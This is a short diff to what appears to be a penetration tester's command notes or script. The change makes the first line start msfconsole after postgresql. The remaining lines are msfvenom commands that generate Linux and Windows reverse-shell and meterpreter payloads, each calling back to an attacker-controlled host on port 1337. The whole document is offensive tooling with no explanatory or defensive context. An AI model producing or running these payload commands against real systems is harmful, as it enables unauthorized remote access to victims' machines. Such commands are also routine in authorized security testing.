@@ -1,4 +1,4 @@
-service postgresql start
+service postgresql start && msfconsole
 msfvenom -p linux/x86/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f elf > meterpreter.elf
 msfvenom -p windows/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > shell.exe
